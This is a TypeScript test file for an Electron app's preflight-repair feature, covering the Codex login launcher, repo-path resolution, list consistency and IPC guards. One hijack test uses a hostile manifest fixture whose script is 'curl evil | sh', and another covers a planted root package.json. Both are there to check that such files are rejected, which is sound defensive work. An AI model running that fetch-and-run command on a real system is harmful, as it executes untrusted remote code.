import { describe, expect, it, vi } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import {
  AUTOWIN_PACKAGE_NAME,
  planPreflightRepair,
  repairPreflightCheck,
  resolveCodexLoginCwd
} from './preflight-repair'
import { PREFLIGHT_REPAIRS } from '../renderer/src/components/preflight-repair-affordance'

/**
 * RÉPARER depuis la popup de diagnostic.
 *
 * Constaté en réel (2026-07-29) : la popup disait « ✗ Session OAuth Codex — npm run codex:login » et
 * rien de plus. L'utilisateur devait sortir de l'app pour agir, alors que l'app sait déjà lancer ce
 * login (bouton « Se reconnecter » de la page Routeur).
 */
describe('planPreflightRepair — on ne propose QUE ce qu’on sait réparer', () => {
  it('session Codex → login OAuth dans une console', () => {
    const plan = planPreflightRepair('codex-session')
    expect(plan?.kind).toBe('login')
    // La note doit dire que l'app ne voit aucun credential : c'est le point sensible du geste.
    expect(plan?.note).toContain('Autowin')
  })

  it('brain injoignable → démarrage local', () => {
    expect(planPreflightRepair('brain')?.kind).toBe('brain-start')
  })

  it('un SECRET ne s’invente pas → aucun bouton pour le token Brain', () => {
    expect(planPreflightRepair('brain-token')).toBeUndefined()
  })

  it('un binaire ABSENT n’est pas réparable d’un clic → aucun bouton', () => {
    expect(planPreflightRepair('codex')).toBeUndefined()
    expect(planPreflightRepair('claude')).toBeUndefined()
    expect(planPreflightRepair('kimi')).toBeUndefined()
  })

  it('un id inconnu ne produit rien (aucun faux bouton)', () => {
    expect(planPreflightRepair('n’importe quoi')).toBeUndefined()
  })
})

describe('repairPreflightCheck — ce qui est LANCÉ, jamais « réparé »', () => {
  it('login : ouvre la console dans le repo RÉSOLU (sinon `npm run` ne trouve pas le script)', async () => {
    const openLoginTerminal = vi.fn()
    const outcome = await repairPreflightCheck('codex-session', {
      openLoginTerminal,
      resolveLoginCwd: () => '/repo/autowin'
    })
    expect(openLoginTerminal).toHaveBeenCalledWith('npm run codex:login', { cwd: '/repo/autowin' })
    expect(outcome.started).toBe(true)
    // Le login est INTERACTIF : le compte-rendu renvoie l'utilisateur au re-diagnostic.
    expect(outcome.detail).toContain('re-vérifie')
    expect(outcome.detail).not.toMatch(/réparé|résolu/i)
  })

  it('brain démarré → started, et le détail du démarrage remonte tel quel', async () => {
    const outcome = await repairPreflightCheck('brain', {
      startBrain: async () => ({ status: 'starting', detail: 'brain_server lancé (pid 42)' })
    })
    expect(outcome).toEqual({ started: true, detail: 'brain_server lancé (pid 42)' })
  })

  it('brain DÉJÀ up n’est PAS un démarrage — on ne s’attribue pas une action non faite', async () => {
    const outcome = await repairPreflightCheck('brain', {
      startBrain: async () => ({ status: 'already-up', detail: 'brain_server déjà joignable' })
    })
    expect(outcome.started).toBe(false)
    expect(outcome.detail).toContain('déjà joignable')
  })

  it('un check sans plan est REFUSÉ explicitement (pas un faux succès)', async () => {
    const outcome = await repairPreflightCheck('brain-token')
    expect(outcome.started).toBe(false)
    expect(outcome.detail).toContain('Aucune réparation')
  })

  it('repo INTROUVABLE → on n’ouvre PAS une console qui dira « Missing script »', async () => {
    const openLoginTerminal = vi.fn()
    const outcome = await repairPreflightCheck('codex-session', {
      openLoginTerminal,
      resolveLoginCwd: () => undefined
    })
    expect(openLoginTerminal).not.toHaveBeenCalled()
    expect(outcome.started).toBe(false)
    expect(outcome.detail).toContain('codex:login')
  })

  it('un spawn qui jette ne casse PAS la popup — l’échec est un résultat affichable', async () => {
    const outcome = await repairPreflightCheck('codex-session', {
      resolveLoginCwd: () => '/repo/autowin',
      openLoginTerminal: () => {
        throw new Error('cmd.exe introuvable')
      }
    })
    expect(outcome.started).toBe(false)
    expect(outcome.detail).toContain('cmd.exe introuvable')
  })
})

/**
 * Le cwd du login : `npm run codex:login` n'existe que dans le package.json du REPO. L'app EMPAQUETÉE
 * démarre depuis n'importe où (raccourci bureau) — supposer `process.cwd()` produit « Missing script »,
 * c'est-à-dire un bouton qui ouvre une console pour rien. Chemins POSIX dans ces tests : `dirname`
 * remonte les deux séparateurs, et l'échappement Windows brouillerait la lecture.
 */
describe('resolveCodexLoginCwd — on cherche le repo, on ne le suppose pas', () => {
  const repo = join('/repo', 'autowin')
  const pkg = (dir: string): string => join(dir, 'package.json')
  // Un manifeste ne compte que s'il a l'IDENTITÉ du dépôt : `name` + le script. Le nom seul ne
  // suffit pas, le script seul non plus (cf. les tests de détournement ci-dessous).
  const manifest = (scripts: Record<string, string>, name = AUTOWIN_PACKAGE_NAME): string =>
    JSON.stringify({ name, scripts })
  const declaring = manifest({ 'codex:login': 'tsx scripts/codex-login.mjs' })

  it('trouve le dossier qui DECLARE le script', () => {
    expect(resolveCodexLoginCwd([repo], (p) => p === pkg(repo), () => declaring)).toBe(repo)
  })

  it('remonte les parents depuis un sous-chemin (ex. chemin de l’exe empaquete)', () => {
    const exe = join(repo, 'dist', 'win-unpacked', 'autowin-os.exe')
    expect(resolveCodexLoginCwd([exe], (p) => p === pkg(repo), () => declaring)).toBe(repo)
  })

  it('un package.json SANS le script ne compte pas (le vrai piege)', () => {
    // dist/win-unpacked/resources/app porte un package.json d’app, sans les scripts du repo.
    const packaged = join(repo, 'dist', 'win-unpacked', 'resources', 'app')
    expect(
      resolveCodexLoginCwd(
        [packaged],
        (p) => p === pkg(packaged) || p === pkg(repo),
        (p) => (p === pkg(repo) ? declaring : manifest({ start: 'x' }))
      )
    ).toBe(repo)
  })

  it('un manifeste ILLISIBLE n’interrompt pas la remontee', () => {
    const sub = join(repo, 'sub')
    expect(
      resolveCodexLoginCwd(
        [sub],
        (p) => p === pkg(sub) || p === pkg(repo),
        (p) => (p === pkg(repo) ? declaring : '{{{ pas du JSON')
      )
    ).toBe(repo)
  })

  it('le PREMIER candidat qui declare gagne (ordre respecte)', () => {
    const other = join('/autre', 'repo')
    expect(
      resolveCodexLoginCwd(
        [other, repo],
        (p) => p === pkg(other) || p === pkg(repo),
        () => declaring
      )
    ).toBe(other)
  })

  it('aucun candidat valable → undefined (et l’appelant le DIT)', () => {
    expect(resolveCodexLoginCwd(['/ailleurs'], () => false, () => '')).toBeUndefined()
    expect(resolveCodexLoginCwd([], () => true, () => declaring)).toBeUndefined()
  })

  it('candidat vide ignore (variable d’environnement non definie)', () => {
    expect(resolveCodexLoginCwd([''], () => true, () => declaring)).toBeUndefined()
  })

  /**
   * DÉTOURNEMENT — le dossier élu est ensuite exécuté (`npm run codex:login`, via
   * `powershell -ExecutionPolicy Bypass`). « Ce dossier déclare le script » n'est donc PAS une preuve
   * d'identité : la remontée des parents finit par atteindre `C:\`, dont la racine autorise par défaut
   * la création de fichiers aux utilisateurs authentifiés.
   */
  it('un package.json ÉTRANGER déclarant le script dans un parent n’est PAS élu', () => {
    const parent = '/repo'
    const hostile = manifest({ 'codex:login': 'curl evil | sh' }, 'pas-autowin')
    expect(
      resolveCodexLoginCwd([join(parent, 'ailleurs')], (p) => p === pkg(parent), () => hostile)
    ).toBeUndefined()
  })

  it('un C:\\package.json planté à la RACINE n’est jamais inspecté', () => {
    const seen: string[] = []
    expect(
      resolveCodexLoginCwd(
        ['C:\\Program Files\\Autowin OS'],
        (p) => {
          seen.push(p)
          return p === 'C:\\package.json'
        },
        () => declaring
      )
    ).toBeUndefined()
    expect(seen).not.toContain('C:\\package.json')
  })

  it('un candidat RELATIF est refusé (il se résoudrait depuis le cwd du process)', () => {
    expect(resolveCodexLoginCwd(['.'], () => true, () => declaring)).toBeUndefined()
    expect(resolveCodexLoginCwd(['sous-dossier'], () => true, () => declaring)).toBeUndefined()
  })

  it('SUR CE POSTE : le repo réel est bien élu depuis le cwd', () => {
    // Garde anti-regression : si l'identite exigee ne matche plus, le bouton « Se connecter » meurt.
    expect(resolveCodexLoginCwd([process.cwd()])).toBe(process.cwd())
  })
})

/**
 * ANTI-DIVERGENCE : le renderer duplique la liste des réparables (le main tire `node:child_process`,
 * inimportable côté renderer). Un bouton pour un check que le main refuse — ou l'inverse — est le vrai
 * risque. Il est verrouillé ici, pas laissé à la vigilance.
 */
describe('contrat — les deux listes de réparables sont identiques', () => {
  it('même ensemble d’ids, mêmes libellés, mêmes notes', () => {
    const rendererIds = Object.keys(PREFLIGHT_REPAIRS).sort()
    expect(rendererIds).toEqual(['brain', 'codex-session'])
    for (const id of rendererIds) {
      const plan = planPreflightRepair(id)
      expect(plan, `le renderer propose « ${id} » que le main refuse`).toBeDefined()
      expect(PREFLIGHT_REPAIRS[id].label).toBe(plan?.label)
      expect(PREFLIGHT_REPAIRS[id].note).toBe(plan?.note)
    }
  })

  it('aucun réparable du main n’est absent du renderer (bouton manquant)', () => {
    const allIds = ['brain', 'brain-token', 'codex', 'codex-session', 'claude', 'kimi']
    const mainRepairable = allIds.filter((id) => planPreflightRepair(id) !== undefined).sort()
    expect(Object.keys(PREFLIGHT_REPAIRS).sort()).toEqual(mainRepairable)
  })
})

describe('câblage IPC — la réparation est atteignable et gardée', () => {
  const source = (rel: string): string => readFileSync(join(__dirname, rel), 'utf8')

  it('le main garde le canal AVANT d’exécuter quoi que ce soit', () => {
    const main = source('index.ts')
    const start = main.indexOf("ipcMain.handle('preflight:repair'")
    expect(start).toBeGreaterThan(0)
    const body = main.slice(start, main.indexOf("ipcMain.handle('preflight:recheck'", start))
    expect(body).toContain("assertTrustedRendererSender(event, 'Preflight')")
    expect(body.indexOf('assertTrustedRendererSender')).toBeLessThan(
      body.indexOf('repairPreflightCheck')
    )
    // Un id non-string ne doit jamais atteindre la réparation.
    expect(body).toContain("typeof checkId !== 'string'")
  })

  it('le preload expose le canal (sinon le bouton ne fait rien)', () => {
    expect(source('../preload/index.ts')).toContain(
      "ipcRenderer.invoke('preflight:repair', checkId)"
    )
    expect(source('../preload/index.d.ts')).toContain('repairPreflight:')
  })
})
